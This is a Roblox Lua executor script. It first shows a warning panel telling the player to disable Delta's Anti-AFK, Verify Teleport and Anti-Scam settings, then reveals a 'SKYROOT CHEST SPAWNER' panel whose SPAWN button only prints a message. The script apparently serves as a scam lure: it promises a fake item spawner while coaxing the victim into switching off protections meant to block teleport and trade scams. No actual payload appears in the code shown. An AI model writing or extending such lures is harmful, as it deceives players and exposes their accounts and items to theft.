--// SCRIPT COMBINED

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

---------------------------------------------------------
-- Script #1 : Delta Warning UI
---------------------------------------------------------
local screenGui1 = Instance.new("ScreenGui")
screenGui1.Name = "DeltaWarningUI"
screenGui1.ResetOnSpawn = false
screenGui1.Parent = playerGui

local frame1 = Instance.new("Frame")
frame1.Size = UDim2.new(0, 400, 0, 220)
frame1.Position = UDim2.new(0.5, -200, 0.5, -110)
frame1.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame1.BorderSizePixel = 0
frame1.Active = true
frame1.Draggable = true
frame1.Parent = screenGui1

local corner1 = Instance.new("UICorner")
corner1.CornerRadius = UDim.new(0, 12)
corner1.Parent = frame1

local title1 = Instance.new("TextLabel")
title1.Size = UDim2.new(1, -20, 0, 40)
title1.Position = UDim2.new(0, 10, 0, 10)
title1.BackgroundTransparency = 1
title1.Text = "⚠️ Turn off all on Delta settings ⚠️"
title1.TextColor3 = Color3.fromRGB(255, 0, 0)
title1.Font = Enum.Font.GothamBold
title1.TextSize = 20
title1.Parent = frame1

local instructions1 = Instance.new("TextLabel")
instructions1.Size = UDim2.new(1, -20, 0, 100)
instructions1.Position = UDim2.new(0, 10, 0, 50)
instructions1.BackgroundTransparency = 1
instructions1.TextXAlignment = Enum.TextXAlignment.Left
instructions1.TextYAlignment = Enum.TextYAlignment.Top
instructions1.Text = [[
1. Disable Anti-AFK
2. Disable Verify Teleport
3. Disable Anti-Scam

✅ After disabling, press OK to continue.
]]
instructions1.TextColor3 = Color3.fromRGB(255, 255, 255)
instructions1.Font = Enum.Font.Gotham
instructions1.TextSize = 16
instructions1.Parent = frame1

local okayBtn = Instance.new("TextButton")
okayBtn.Size = UDim2.new(0, 200, 0, 40)
okayBtn.Position = UDim2.new(0.5, -100, 1, -60)
okayBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
okayBtn.Text = "Okay"
okayBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
okayBtn.Font = Enum.Font.GothamBold
okayBtn.TextSize = 20
okayBtn.Parent = frame1

local btnCorner1 = Instance.new("UICorner")
btnCorner1.CornerRadius = UDim.new(0, 8)
btnCorner1.Parent = okayBtn


---------------------------------------------------------
-- Script #2 : TOCHIPYRO UI (Hidden at first)
---------------------------------------------------------
local screenGui2 = Instance.new("ScreenGui")
screenGui2.Name = "TOCHIPYRO"
screenGui2.Enabled = false -- HIDE first
screenGui2.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui2

local title2 = Instance.new("TextLabel")
title2.Size = UDim2.new(1, 0, 0, 40)
title2.BackgroundTransparency = 1
title2.Text = "SKYROOT CHEST SPAWNER"
title2.TextColor3 = Color3.fromRGB(0, 255, 127)
title2.TextScaled = true
title2.Font = Enum.Font.SourceSansBold
title2.Parent = mainFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -20, 0, 40)
textBox.Position = UDim2.new(0, 10, 0, 50)
textBox.PlaceholderText = "Enter Name"
textBox.Text = ""
textBox.TextScaled = true
textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.Font = Enum.Font.SourceSans
textBox.Parent = mainFrame

local spawnBtn = Instance.new("TextButton")
spawnBtn.Size = UDim2.new(1, -20, 0, 40)
spawnBtn.Position = UDim2.new(0, 10, 0, 100)
spawnBtn.Text = "SPAWN"
spawnBtn.TextScaled = true
spawnBtn.Font = Enum.Font.SourceSansBold
spawnBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
spawnBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
spawnBtn.Parent = mainFrame


-- Button Function
spawnBtn.MouseButton1Click:Connect(function()
    local enteredName = textBox.Text
    if enteredName ~= "" then
        print("Spawning chest with name: " .. enteredName)
        -- Replace this with your actual spawn logic
    else
        warn("Please enter a name before spawning.")
    end
end)


---------------------------------------------------------
-- Link Script #1 → Script #2
---------------------------------------------------------
okayBtn.MouseButton1Click:Connect(function()
    screenGui1:Destroy()      -- Remove first UI
    screenGui2.Enabled = true -- Show second UI
end)
